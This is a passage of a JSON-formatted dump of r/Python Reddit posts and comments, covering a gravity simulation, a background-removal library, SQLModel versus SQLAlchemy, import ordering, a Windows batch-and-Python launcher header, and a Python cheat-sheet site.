            "author": "quantumfoam435",
            "score": "7",
            "content": "So I'm curious. Why a square and not a circle."
        },
        {
            "author": "TheRealMerlin",
            "score": "9",
            "content": "I like how a few of them started orbiting."
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "And apparently a blackhole"
        },
        {
            "author": "tb33296",
            "score": "6",
            "content": "Hey, OP, add rotation to the particles and update this please.. Liked it.."
        }
    ]
},
{
    "post_author": "Maleficent_Yak_993",
    "post_id": "1brl380",
    "post_score": "29",
    "post_time": "Saturday, March 30, 2024 at 6:54:08 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "remove background from image using AI in just 5 lines of python code",
    "media": [
        "https://arxiv.org/pdf/2203.03041.pdf",
        "https://www.youtube.com/watch?v=js7AYKkZvFI"
    ],
    "post_content": "I created a python library \"dis-bg-remover\" based off the \"Highly Accurate Dichotomous Image Segmentation (https://arxiv.org/pdf/2203.03041.pdf), whose results are comparable, if not better, to the premium offerings in the market.\nExplainer video here\nhttps://www.youtube.com/watch?v=js7AYKkZvFI",
    "comments": [
        {
            "author": "ThiefMaster",
            "score": "84",
            "content": "Code like this does NOT belong in a library. except Exception as e: print(\"An error occurred:\") traceback.print_exc() return None,None",
            "replies": [
                {
                    "author": "Prize_Plant_3267",
                    "score": "8",
                    "content": "why return a tuple of two 'None'"
                },
                {
                    "author": "Im-Learnd1ng",
                    "score": "12",
                    "content": "Lol but have you seen the error messages you get on some of the most widely available apps on the market? Microsoft to name just one. Still,  I don't condone it"
                },
                {
                    "author": "jayenn7",
                    "score": "5",
                    "content": "Would be helpful to give an example or guidance on what it should look like instead",
                    "replies": [
                        {
                            "author": "omg_drd4_bbq",
                            "score": "11",
                            "content": "Don't ever catch Exception by itself unless you re-raise. It's way too broad. Generally you want to catch the specific exception causing that particular operation to fail, as narrowly as possible.",
                            "replies": [
                                {
                                    "author": "Gamecrazy721",
                                    "score": "3",
                                    "content": "\"Don't ever\" is kind of harsh, there are definitely acceptable uses for it, such as non-critical background tasks. However I agree it's generally not a good idea Edit: someone below mentioned a wrapper around a web API that wraps all exceptions in a 500 response, which is another good example"
                                }
                            ]
                        },
                        {
                            "author": "james_pic",
                            "score": "5",
                            "content": "It just shouldn't be there. If there's an exception the code doesn't have a way to do anything about, just let it propagate. It's unlikely the code that called it can do anything more useful with (None, None) than with an exception (if anything, it's more likely to be able to do something with the exception - it might try to log in again if the exception is credentials related for example), and the exception better pinpoints where the problem happened. The only place it makes sense to catch errors like this is near the outer edge of your program. For example in a web application you might have a wrapper around request handlers that returns a 500 on an unhandled exception and logs the error with its standard logging mechanism (and there's probably a wrapper built into your web app framework if you're using one)."
                        }
                    ]
                },
                {
                    "author": "Maleficent_Yak_993",
                    "score": "3",
                    "content": "guilty as hell :)"
                }
            ]
        },
        {
            "author": "Prize_Plant_3267",
            "score": "7",
            "content": "where's the five lines of code?"
        },
        {
            "author": "backwards_watch",
            "score": "4",
            "content": "I know how to make any code be 2 lines of code. Just write as many lines as you want and save the file. Then create another file and write: import big_file big_file.main()"
        },
        {
            "author": "o5mfiHTNsH748KVq",
            "score": "5",
            "content": "how does this compare to rembg"
        }
    ]
},
{
    "post_author": "Balance-",
    "post_id": "1bvxpgz",
    "post_score": "6",
    "post_time": "Thursday, April 4, 2024 at 11:20:53 PM GMT+3",
    "flair_text": "News",
    "post_title": "UXsim 1.1.0 released: Network traffic flow simulator gets Multilane support",
    "media": [
        "https://github.com/toruseo/UXsim/releases/tag/v1.1.0"
    ],
    "post_content": "Version 1.1.0 of UXsim is released, which now supports modeling multilane ways.\nMain Changes\nAdd support for multilane links. More technically, it is a multilane, single-pipe model where vehicles cannot overtake others. This allows us to set traffic capacity significantly larger while keeping consistency to KW theory.\nSeparate Analyzer class from uxsim.py. This means that uxsim.py now contains only the essential codes for the simulation. It makes it easier for users to understand the simulation logic.\nUXsim\nUXsim is a free, open-source macroscopic and mesoscopic network traffic flow simulator written in Python. It simulates the movements of car travelers and traffic congestion in road networks. It is suitable for simulating large-scale (e.g., city-scale) traffic phenomena. UXsim is especially useful for scientific and educational purposes because of its simple, lightweight, and customizable features, but users are free to use UXsim for any purpose.",
    "comments": [
        {
            "author": "mrmrn121",
            "score": "1",
            "content": "what are the rewuirements for UXsim?",
            "replies": [
                {
                    "author": "Balance-",
                    "score": "2",
                    "content": "Nothing special, it's plain Python, so it runs on just about everything!"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1brwdpt",
    "post_score": "2",
    "post_time": "Sunday, March 31, 2024 at 3:00:11 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Everythingcrashing",
            "score": "2",
            "content": "Pythonic exercise: Hangman game developed from the ground up; trying to “master” syntax. Month 2: I’ve now implemented a hard mode, so it gives you a list of long strange words and you only have a few guesses to get it right. Unsure what to do for April; maybe just fine tune the user experience until I hit a better idea. Someone mentioned the random word module but I don’t know how to pip yet",
            "replies": [
                {
                    "author": "Everythingcrashing",
                    "score": "1",
                    "content": "Obvious answer: package it all w pygame"
                }
            ]
        },
        {
            "author": "Knockoutpie1",
            "score": "1",
            "content": "I couldn’t get FedEx API or UPS API working. I need to download proof of delivery documents from freight carrier sites based on a tracking number. I pass a value from a worksheet using Pandas and then with Selenium UC it opens the tracking number on that carrier site and navigates and downloads the document. It loops through row-by-row until the end of the worksheet, opening the links (generated by using the tracking number) and downloads the PDF. Some of the PDF viewers on carrier sites are difficult to interact with using selenium so that’s where I use PyautoGui to pass keys like tab and enter. Also, I had to use Undetected (UC) selenium because some sites have anti-bot measurements. I have FedEx and UPS automated, plans to add DHL, Old Dominion and a few others down the line. 60 pdf downloads per day!",
            "replies": [
                {
                    "author": "jeffrey_f",
                    "score": "1",
                    "content": "You may need to login for the API's. This will require passing in credentials. The documentation for the API's should have demonstration code."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "Wrote a pipeline that automates the process of downloading data in the form of excel files, transforming said data into a complete table and uploading it to a database."
        },
        {
            "author": "tctdiy",
            "score": "1",
            "content": "I am working on my own Project (mylocale). It is a Library for easy localization with CSV files. In side this Project I am working on a solution to place variables inside the translated strings. Would be cool if someone could help me with that :)"
        },
        {
            "author": "DefinitelyNotEmu",
            "score": "1",
            "content": "Adventure! Interactive story engine for designing, editing and playing choose-your-own-adventure stories https://github.com/ViciousSquid/Adventure https://vicioussquid.pythonanywhere.com/ I'm reaching out developers to get involved with some tricky stuff that I am really struggling with"
        },
        {
            "author": "loopbootoverclock",
            "score": "1",
            "content": "struggling to put together a gui for work, I want it to be essentially an constructible map layout of the different buildings and rooms for our labs, where it shows each computer and has a popup if there are any that are not connected to domain or not responding to pings, would also like to be able to click it and remote in quickly to install software when pushing isnt working. I am trying to learn Tkinter as it sounds like it would be a good option. any ideas?",
            "replies": [
                {
                    "author": "binlargin",
                    "score": "1",
                    "content": "I don't know but it sounds like you want to cleanly separate the UI and the data format, and have options for different rendering methods in future. I'd start with Pydantic to define the object model, then write something to dump the tree to whatever layout engine or graph library that works. JSON is free for the disk format, or a database if you like. Then maybe make an SVG output, or Mermaid. Or serve using FastAPI and do the front end in D3.js."
                }
            ]
        }
    ]
},
{
    "post_author": "HP7933",
    "post_id": "1bwpgkz",
    "post_score": "14",
    "post_time": "Friday, April 5, 2024 at 9:34:58 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "The Python on Microcontrollers (and Raspberry Pi) Newsletter. Weekly news, subscribe for free",
    "media": [
        "https://www.adafruitdaily.com/"
    ],
    "post_content": "With the Python on Microcontrollers newsletter, you get all the latest information on Python running on hardware in one place! MicroPython, CircuitPython and Python on single Board Computers like Raspberry Pi & many more.\nThe Python on Microcontrollers newsletter is the place for the latest news. It arrives Monday morning with all the week’s happenings. No advertising, no spam, easy to unsubscribe.\n10,921 subscribers - the largest Python on hardware newsletter out there.\nCatch all the weekly news on Python for Microcontrollers with adafruitdaily.com.\nThis ad-free, spam-free weekly email is filled with CircuitPython, MicroPython, and Python information that you may have missed, all in one place!\nEnsure you catch the weekly Python on Hardware roundup– you can cancel anytime – try our spam-free newsletter today!\nhttps://www.adafruitdaily.com/",
    "comments": [
        {
            "author": "mikechinea",
            "score": "4",
            "content": "I swore off getting anymore newsletters but I signed up for this one anyway, may the spam bots be gentle on me",
            "replies": [
                {
                    "author": "HP7933",
                    "score": "2",
                    "content": "No spam will ever be sent, leaving is easy. All part of Adafruit.com's policies. No advertising either (though the newsletter leans a bit Adafruit as they are doing a lot in this space."
                }
            ]
        },
        {
            "author": "wdnleg_513",
            "score": "1",
            "content": "I don’t"
        },
        {
            "author": "NeighborhoodOk92",
            "score": "1",
            "content": "Great!"
        }
    ]
},
{
    "post_author": "TraditionalAlps4337",
    "post_id": "1bmj870",
    "post_score": "7",
    "post_time": "Sunday, March 24, 2024 at 3:07:09 PM GMT+3",
    "flair_text": "Feedback Request",
    "post_title": "Text extraction lib",
    "media": [
        "https://github.com/KirillAn/extractText/tree/main"
    ],
    "post_content": "I created a simple tool for extracting text from PDF, EPUB, TXT, and DOCX files.It is mainly for personal use, but I would really appreciate a feedback\nhttps://github.com/KirillAn/extractText/tree/main",
    "comments": [
        {
            "author": "sanbales",
            "score": "7",
            "content": "I would remove the DS_Store files and add them to your gitignore. Also, this looks like a thin wrapper for other parsers. I would state that in your readme and specify which parsers are used for each file type."
        },
        {
            "author": "ta1901",
            "score": "3",
            "content": "There are many PDFs that are a series of images, one for each page of a book. Archive.org and Google Books have many like that. Does your lib exclude that because it does not do OCR?",
            "replies": [
                {
                    "author": "TraditionalAlps4337",
                    "score": "1",
                    "content": "I am planning to implement it"
                },
                {
                    "author": "TraditionalAlps4337",
                    "score": "1",
                    "content": "Kinda did it, you can check it out"
                }
            ]
        },
        {
            "author": "pb_problem_solving",
            "score": "1",
            "content": "how do you serve the flex, does a request need to be literal?"
        }
    ]
},
{
    "post_author": "Raz_Crimson",
    "post_id": "1br19x3",
    "post_score": "30",
    "post_time": "Saturday, March 30, 2024 at 1:22:56 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "SQLModel vs native SQL Alchemy ORM for a web backend?",
    "media": [
        "https://stackoverflow.com/questions/76339262"
    ],
    "post_content": "Hi there\nI was tasked with migrating from mongoDb to PostgreSQL due to the performance issues.\nThe backend is FastAPI-based web server for a mobile APP with a decent amount if CRUD. We also heavily use Pydantic for data validation and the primary carried of data across the service layers\nWould like to hear opinions from SQLModel users as to how easy it is to use or what kind of pitfalls am i setting myself up by using it. Last post that I could find was years old and even that was not really conclusive. Now SQLAlchemy 2.0 is released and even SQLModel has support for Pydantic V2, so would like some newer thoughts in this topic.\nOur datamodel includes quite a bit of top level nestings, which I would prefer to be stored as `JSON` columns (Similar SO Question). SQLModel doesn't seem to have any documentation for such cases.\nIf possible I would prefer avoiding to write and maintain our own internal library with SQLAlchemy ORM to perform these conversions. But maybe just using plain SQLAlchemy and Pydantic might be a good solution too.\nSeeking inputs from more experienced users. Thank you.\nEdit:\nIn the end I gave up on using orm to query data and just used plain SQLAlchemy queries.\nThe reason was that the ORM layer already abstract lot of stuff from us and SQLModel makes it more abstracted.\nThis is fine if you know all the details of the abstractions. But at the point I am in, where I am new to sqlalchemy, it just adds lots more complexity and gotchas which can just avoid with plain queries.\nMaybe better documentation might help down the line but as of now, I am leaning towards just plain sqlqlchemy core.\nAlso using the ORM layer to just auto generate revisions is a nice feature.",
    "comments": [
        {
            "author": "Zizizizz",
            "score": "13",
            "content": "SQLmodel was too young when I first evaluated it so I didn't really consider it thinking that it depends on SQLalchemy so might as well just use SQLalchemy. Yes, I duplicated the class declarations for the models in the DB and validation but I gained access to automatic alembic migrations without concern about additional layers of abstraction breaking them. Depending on the dB calls I also wrote plenty of plain SQL using SQlalchemy core instead of the orm to ensure I could improve performance on reads."
        },
        {
            "author": "-xx88",
            "score": "10",
            "content": "I personally don’t see any reasons to use sqlmodel now. It looks just like a redundant layer. Imo - go with alchemy. Since v2 it has better async support and can be perfectly combined with the pydantic"
        },
        {
            "author": "BytePhilosopher",
            "score": "10",
            "content": "I’m a big fan of writing my own queries, it’s easier to both read and write later on when you need to work on something or modify something later on down the road. I still use SQLalchemy for the connection handler and for alembic though",
            "replies": [
                {
                    "author": "glacierre2",
                    "score": "5",
                    "content": "It is really easy to use a ORM and forget about SQL, it is also really easy to start triggering n queries per element because you are not thinking any more. I was bitten hard once I migrated an app from a single user+SQLite, were my naivety was hidden by the fast local queries, to multi-user+postgres with a dedicated server. Boy, did the performance crumble. I wrote quite a few queries then, including some dark recursive magic, and it flew!"
                }
            ]
        },
        {
            "author": "scottix",
            "score": "8",
            "content": "Depending on your project and how much risk you are willing to take. SQLModel seems like a good layer, I think my only concern as you have brought up, is it's just not baked enough and putting that in production seems a little risky too me at the moment."
        },
        {
            "author": "mangecoeur",
            "score": "3",
            "content": "I had the a similar issue, in a first instance I went with duplicated data models (pydantic + sqlalchemy classes) because SQLModel I think is too immature for serious use right now. But now we started to move towards using dataclasses (see sqlalchemy dataclass support) for new code, and slowly converting pydantic models to pydantic dataclass models with the goal of eventually having just sqlalcalchemy dataclasses with pydantic validation (we haven't achieved this yet mind). One thing I realised over time is I underestimated how powerful SqlAlchemy is (you really see the decades of work behind it). We had a lot of CRUD code that was just dealing with issues of loading into/out of pydantic models but when we started to *properly* use SqlAlchemy mapped classes and Sessions I realised how much you code you can get rid of. E.g. instead of having CRUD functions with various options and args you just directly use the query api, its usually a one liner that does exactly what you want rather than trying to design options for your own CRUD api."
        },
        {
            "author": "sherbang",
            "score": "3",
            "content": "I'm trying to stop using pydantic altogether, so that rules out anything that makes pydantic a hard requirement. I'm instead using dataclasses and msgspec and it's working out better."
        },
        {
            "author": "MrKooops",
            "score": "2",
            "content": "Just evaluated SQLModel a week ago and you still had to heavily rely ob SQLAlchemy for the more advanced stuff. Went back to pure SQL since i hate SQLAlchemy (no reason, just can‘t get around permanently googling more advanced stuff)"
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "In this case I'd go with SQLAlchemy"
        }
    ]
},
{
    "post_author": "lizziemoon89",
    "post_id": "1bv9of6",
    "post_score": "133",
    "post_time": "Thursday, April 4, 2024 at 3:45:59 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Does it really matter what order you import modules in python?",
    "media": [],
    "post_content": "I am trying to understand why anyone would care whether you import math or numpy first. I am told it is good practise but it just seem pointless to care.",
    "comments": [
        {
            "author": "v_a_n_d_e_l_a_y",
            "score": "448",
            "content": "It's good practice to group by type of package. In particular: any builtins (math), any installed packages (numpy) and any custom or local ones. Why does it matter? The same reason most code standards exist.  Because then someone reading your code can easily understand what's going on. For example if I'm reading some random module on GitHub and see \"import giraffe\", the first thing I want to know is whether giraffe is a something i need to install or a reference to another file in the repo.",
            "replies": [
                {
                    "author": "i_can_haz_data",
                    "score": "154",
                    "content": "This is the way. Standard libs, External libs, Internal libs… in that order in blocks at the top, labeled as such.",
                    "replies": [
                        {
                            "author": "kahoinvictus",
                            "score": "21",
                            "content": "I just realized this is how I order them in basically every language I use. I don't label them, but in languages like C# and rust it's usually much easier to infer from package names (standard libs will always start with System. in C#, and std:: in rust, and internal libs can usually be similarly inferred)"
                        },
                        {
                            "author": "crumpuppet",
                            "score": "11",
                            "content": "PEP-8, baby!"
                        },
                        {
                            "author": "Jattoe",
                            "score": "1",
                            "content": "Yeah this has been (basically) my order just by circumstance of how I make things--sometimes the external and the standards are switched because the project I'm working on were conceived with an external library in mind. But I'll keep it in mind, TY"
                        },
                        {
                            "author": "Wise_Tie_9050",
                            "score": "1",
                            "content": "I go a bit further: standard libs framework libs (in my case, Django) other third-party libs internal libs (other project-local django apps) local (relative) references",
                            "replies": [
                                {
                                    "author": "billsil",
                                    "score": "1",
                                    "content": "I go in order of how much I trust them, which is standard library, numpy, scipy, matplotlib, pandas, Vtk, internal libs, my library"
                                }
                            ]
                        },
                        {
                            "author": "[deleted]",
                            "score": "0",
                            "content": "That’s why they said it."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Drevicar",
            "score": "70",
            "content": "Use `ruff` or `isort` to sort your imports into a standardized format. And while you are at it also use `ruff` or `black` to format your code. These are two things that are important enough to matter, but not important enough to ever talk about. Pick a standard and enforce it. As for when you would ever want to sort your imports in an order that is anything but what is done automatically by those tools is because python executes the top-level code in each module recusively as imported. This means importing a module can cause side-effects, and sometimes the order in which these side effects happens matters a lot. An example of this is when you want to silence a specific warning you would need to import the warning module first (which is normally last when sorted alphabetically) then import the offending module as in: https://docs.python.org/3/library/warnings.html#overriding-the-default-filter",
            "replies": [
                {
                    "author": "NoahApples",
                    "score": "21",
                    "content": "Yep! I laughed when I saw this thread, because I’ve personally caused a bug for myself on a (poorly set up, learning project) Flask app by having imported modules running code in an order that caused bewildering side effects. The best part was when I finally figured out that adjusting the order of imports fixed the bug, and then it immediately reverted back when it formatted on save."
                }
            ]
        },
        {
            "author": "Captain0bvious00",
            "score": "69",
            "content": "I don’t care but isort does all that for me to meet PEP standards. I don’t think it will affect your application much though. Open to hear any scenarios where it matters.",
            "replies": [
                {
                    "author": "djmcdee101",
                    "score": "26",
                    "content": "If you're doing something like from module import * a lot and there are two things imported with the same name then it will be the last thing imported that is assigned to that name. So if you want to use the first thing you imported you need to change the import order. Which is why using * imports is a bad idea and much better to explicitly import what you need and if there are colliding names alias them like from module import duplicate_name as non_duplicate_name"
                }
            ]
        },
        {
            "author": "albionandrew",
            "score": "39",
            "content": "Pep 8 - suggests standard imports first, then third-party libraries, then local imports. https://pylint.readthedocs.io/en/latest/user_guide/messages/convention/wrong-import-order.html"
        },
        {
            "author": "deep_mind_",
            "score": "31",
            "content": "Meh, don't put much stock by it. Packages import their own dependencies, you do your thing. Personally, I organize mine by \"scope\" and then alphabetically: import os import time import numpy as np import pandas as pd import some_local_module import some_other_module It's unambiguous and easy to keep consistent",
            "replies": [
                {
                    "author": "crunchy_crow",
                    "score": "11",
                    "content": "Yaml is not a part of standard library though."
                }
            ]
        },
        {
            "author": "Nater5000",
            "score": "21",
            "content": "First, things can happen when you import stuff. It's bad practice for this to occur, but it happens. So sometimes the order you import things can have a functional affect. Second, organization is important as things get more complex. Guidelines for importing modules can be arbitrary, but the important bit is that they're consistent. If you're important things without any sort of a rhyme or reason, you'll start running into issues where you're importing things twice, or by different names, etc."
        }
    ]
},
{
    "post_author": "tan_tata_chan",
    "post_id": "1bmg0hn",
    "post_score": "8",
    "post_time": "Sunday, March 24, 2024 at 11:35:26 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PyBackport: Use instances from newer python releases",
    "media": [
        "https://docs.python.org/3/library/enum.html#enum.StrEnum",
        "https://jtachan.github.io/PyBackport/",
        "https://github.com/Jtachan/PyBackport",
        "https://pypi.org/project/PyBackport/"
    ],
    "post_content": "What My Project Does\nPyBackport holds serves three purposes:\nUse instances from newer python releases in older python versions. For example, using StrEnum (new in python 3.11) in python 3.9\nEnable experimental unreleased classes. For example, define new enums where members are tuples with TupleEnum\nProvide support to commonly used constants. For example, PyBackport allows to import and use colors.RGB to avoid re-defining constant color codes in every new project.\nTarget Audience\nThe audience is developers that must create scripts for older python versions, such as new packages which must support python 3.8+. With PyBackport these instances from newer python versions can be used.\nComparison\nI've not encountered any similar released package with good documentation.\nI also choose not to set a release V1.0 for my package, as I backported only some enums functionality. Anyone feel free to open a new issue, contribute with new pull requests or to notify me any other useful instances to backport. I intend to keep expanding the package as much as possible.\nLinks\nGitHub repo\nPyPI release\nDocumentation",
    "comments": [
        {
            "author": "Dull-Researcher",
            "score": "15",
            "content": "Here's a few things to consider: Print a warning if a backported feature is imported but the current Python version already supports the backported feature. Import the builtin feature rather than your backported feature in the above scenario. Specify the Python version where each backported feature was added as a builtin to the standard library in the Docstring, comment, decorator, and/or documentation. Specify the Python versions that pybackport supports. Does it work all the way back to Python 3.0? What's the maximum backported feature you have, beyond which I don't need your pybackport library and can use the standard library builtin instead? These two versions are pretty darn important. Test your code against all supported Python versions with tox/nox or similar. A backport library needs to be tested with old versions of Python to be usable. Move features that were never supported in an official Python release to a different library. They're not technically a backport, and their behavior may not be perfectly documented or tested. That is, Color enums and TupleEnums don't belong in this backport library. Make a different enum library for those ideas. Everything in a backport library needs to be available in the standard library of the latest version of Python, or a past version of Python if deprecated at some point in the past. Don't include extras, don't include PEP proposals that didn't make it into a final version of Python. The goal for any developer should be to remove pybackport as a dependency from their project once they reach a minimum Python version for their project. If you add in extra classes or implement your classes differently than the standard library, then that makes it difficult for a developer to remove pybackport as a dependency when they upgrade to a newer Python version. This is a non-starter for most developers using your library. This project currently has very little backports. Until it backports most of the features added in 3.11/3.12, to Python 3.10 and earlier, it won't gain much adoption. Right now, it backports some enum stuff, for which there are several enum-focused libraries on GitHub/pypi that I could use: https://github.com/ethanfurman/aenum https://github.com/irgeek/StrEnum https://github.com/clbarnes/backports.strenum Take a glance at what was changed in Python 3.12 and 3.11 to see what all would need to be backported, at a minimum, to make such a library viable. It's an ambitious task, for sure. https://docs.python.org/3.12/whatsnew/3.12.html https://docs.python.org/3.11/whatsnew/3.11.html",
            "replies": [
                {
                    "author": "Rize92",
                    "score": "4",
                    "content": "I agree with everything said here. I would use GitHub Actions to test on different Python versions, just to keep ci/cd and the repo using one service."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1br3mfb",
    "post_score": "2",
    "post_time": "Saturday, March 30, 2024 at 3:00:15 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "hussainsail2002",
            "score": "1",
            "content": "I am looking for resources on the meshcat library for python"
        }
    ]
},
{
    "post_author": "galkinvv",
    "post_id": "1bmc972",
    "post_score": "9",
    "post_time": "Sunday, March 24, 2024 at 7:28:05 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Distributing simple handy scripts for Windows - mouse-startable AND editable (the tricky one-liner)",
    "media": [],
    "post_content": "In short: here is the hacky 2-line header that makes any python script a clickable batch file\n(assuming bundled python in a subfolder)\n@classmethod # 2>nul & (if not exist \"%~dp0\\python64-win\\python.exe\" (echo Fatal python64-win\\python.exe not found & pause) else (title %~f0 & \"%~dp0\\python64-win\\python.exe\" \"%~f0\" %*)) & exit /B & # noqa: E501\ndef __unused(): \"fake function to help writing header that allows executing same file as python and batch\"\n\n# Normal script starts here\nIts usage is either double-click to run without args or \"drag a file on it\" if the script processes a file (passed as an argument). Its installation is as easy as .zip unpacking\nMore detailed:\nFrom time to time I get in touch with small handy one-file python scripts useful for some simple but very handy automations for a some niche use case on the windows platform.\nThis post is not about tasks themselves - there may be really anything, but about distributing them. Such scripts are typically has no any repo/site and just attached to a message or similar, since the author has no any plans for further development, but still wants to share.\n90% of target users are not developers, and just can use the \"double-clickable\" application. The other 10% are developers who may want to perform some script enhancements.\nNon-developers needs \"look at max 1-2 sentence documentation + several clicks to install + several to launch\". Developers need the ability to enhance the script. How to get both satisfied?\nOften such scripts are packed & bundled with a python into a single .exe - this is not editable, the other variant is distributing .py with the too large doc \"download python installer from official site, install it, then click the .py file\" and without an easy way to distribute dependency packages.\nAs an author of some such scripts after several improve iterations I found a solution that satisfy both needs: distribute .zip containing bundled portable python interpreter with preinstalled dependencies in a subdirectory and a clickable file being simultaneously a .bat file and a python script - the extension is .py.bat or just .bat\nGetting portable python is a bit tricky, but embeddable official image is mostly ok.",
    "comments": [
        {
            "author": "Available_Ebb_4262",
            "score": "1",
            "content": "This is neat! Personally I like PyInstaller. Alternatively I believe you could even zip a module, give it a __main__.py and paste its bytes after python.exe",
            "replies": [
                {
                    "author": "Available_Ebb_4262",
                    "score": "1",
                    "content": "This: https://docs.python.org/3/library/zipapp.html#creating-standalone-applications-with-zipapp"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bw3byb",
    "post_score": "1",
    "post_time": "Friday, April 5, 2024 at 3:00:57 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "to_tgo",
    "post_id": "loxpv6",
    "post_score": "1706",
    "post_time": "Sunday, February 21, 2021 at 5:05:25 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "An Interactive Python Cheat Sheet That Brings The Answer To You",
    "media": [
        "https://speedsheet.io/s/python",
        "https://www.youtube.com/watch?v=66RumAF50_4"
    ],
    "post_content": "After realizing that I spent far too much time looking things up while coding, I decided to solve the problem and created this...\nThe Python SpeedSheet: https://speedsheet.io/s/python\nIt is an interactive cheat sheet that brings the answer to you. It is a really simple idea but it worked so well that it has become an indispensable tool for me any time I'm coding. Type in what you are looking for in the search bar and the speed sheet will display the answer.\nIt covers core Python only and I'm sure it is missing 'must have' items but I think it is still very useful.\nTo those of you viewing this on smaller screens, I apologize. I haven't had time to streamline the UI.\nHere is a video to show you how it works:\nhttps://www.youtube.com/watch?v=66RumAF50_4\nTry it out and let me know what you think.\nTLDR:\nThis is an interactive cheat sheet for core Python.",
    "comments": [
        {
            "author": "Shiv_ka_ansh_",
            "score": "62",
            "content": "Very useful. Great initiative👍"
        },
        {
            "author": "thesheff17",
            "score": "37",
            "content": "can you put the code on github? looks like a cool project. I could def see a copy to clipboard button by the code that you think you will copy/paste often. Would be cool to make a django or similar speedsheet if possible.",
            "replies": [
                {
                    "author": "to_tgo",
                    "score": "38",
                    "content": "I actually have an app version of this I use for my personal stuff and I think it is brilliant! I'm considering putting it out at some point. Django is definitely on the list and I'm looking for ideas for things people will find useful. Numpy is probably next.",
                    "replies": [
                        {
                            "author": "OperationOtherwise26",
                            "score": "8",
                            "content": "would you bi so kind to send me the app?? 0:00 0:01 0:01",
                            "replies": [
                                {
                                    "author": "benargee",
                                    "score": "22",
                                    "content": "would you bi so kind to send me us the app??"
                                },
                                {
                                    "author": "Caveskelton",
                                    "score": "1",
                                    "content": "how do you relying gifs?",
                                    "replies": [
                                        {
                                            "author": "OperationOtherwise26",
                                            "score": "2",
                                            "content": "I have it implement in Keyboard... 0:00 0:00 0:00"
                                        }
                                    ]
                                }
                            ]
                        },
                        {
                            "author": "[deleted]",
                            "score": "2",
                            "content": "app please! great work!"
                        },
                        {
                            "author": "lordmoriartea",
                            "score": "3",
                            "content": "good stuff be sure to share the git of this. Can be used very creatively on many things."
                        },
                        {
                            "author": "ad1413",
                            "score": "1",
                            "content": "Oooo numpy please please"
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "30",
            "content": "Pushing this into a VS Code extension would be a great next step. Keep people out of their web browser and all the potential distractions"
        },
        {
            "author": "ciscocollab",
            "score": "18",
            "content": "Really well done. I think if this was on GitHub, it would let people add new Pull Requests with new code example and it could be a community driven project. But even if it’s not on GitHub, I will see myself using this a lot so thanks!"
        },
        {
            "author": "F-C0D3",
            "score": "10",
            "content": "Thank you! This helps a lot for beginners as myself."
        },
        {
            "author": "Jet61007",
            "score": "8",
            "content": "Amazing My undergrad days of Java (it was the future language for all! Haha) tests with notepad and only javadocs ...wish this type of search interpreter was around- rote memorization was the only way Would love to see this extend to charts, data analysis, and basics to things like numpy, pandas, and R"
        },
        {
            "author": "Working-Mind",
            "score": "6",
            "content": "Great job and thank you so much! Easy searching, syntax and EXAMPLES equals perfection!"
        },
        {
            "author": "Theonetheycallgreat",
            "score": "5",
            "content": "Where did you get all the guides?"
        },
        {
            "author": "jjjohhn",
            "score": "5",
            "content": "Thank you!"
        },
        {
            "author": "PrinCe_LoGic",
            "score": "5",
            "content": "So it's basically like man pages, but for Python? Very cool indeed!"
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "eorvjg",
    "post_score": "1787",
    "post_time": "Wednesday, January 15, 2020 at 12:31:39 AM GMT+3",
    "flair_text": "",
    "post_title": "I made a gravity simulation https://github.com/phgilde/gravity_simulation",
    "media": [
        "https://external-preview.redd.it/d5rbPiPJ6EojCKoPVd37nNOYbeXeIaAnzVeMrUwNxJE.png?width=640&crop=smart&format=pjpg&auto=webp&s=75d26dbf71b46601a6656999fab320c8726e88f7"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "psharpep",
            "score": "260",
            "content": "Nice start here! I noticed you mentioned this sim took 3 hours to run - if you're interested in further improving this code, you can probably get 1000x faster performance on the same hardware. Consider looking into the following topics (you should be able to find more info on all of them with a Google search): Vectorization. A specific example is getting rid of your for loop in simulate.py line 66 - this can be easily done with NumPy vectorization instead, which will make this much faster. Alternatively, you can at the very least give this a Numba @jit decorator by adding just a single line of code, which will move this for loop down to low-level code. Better integration schemes. Your RK4 implementation is a great start! Adaptive RK4 schemes will be a lot faster, though, and symplectic schemes will be astronomically more accurate for an orbital dynamics simulation. Fast Multipole Method interactions - this one's absolutely HUGE. Right now, your function to calculate acceleration due to gravity, a(x), is of computational complexity O(n2 ) - the time it takes to run is proportional to the number of particles squared. The fast multipole method (\"FMM\", often referred to as one of the top 10 most important algorithms of the 20th century), gives you an arbitrarily-precise solution to this problem that has complexity O(n log(n) ). This will literally get you a thousand-fold faster calculation right here alone. Object-oriented methods. You have a ton of redundant calculations: for example, you recalculate the radius of each object at each timestep (simulate.py line 69), when you really only need to recalculate it after each collision - if there's no collision, the radius of the particle doesn't change. Source: grad student whose research involves a lot of scientific computing",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "42",
                    "content": "So I tried looking into fmm but didn't understand it really. Do you know some resources to get into it?",
                    "replies": [
                        {
                            "author": "memebecker",
                            "score": "8",
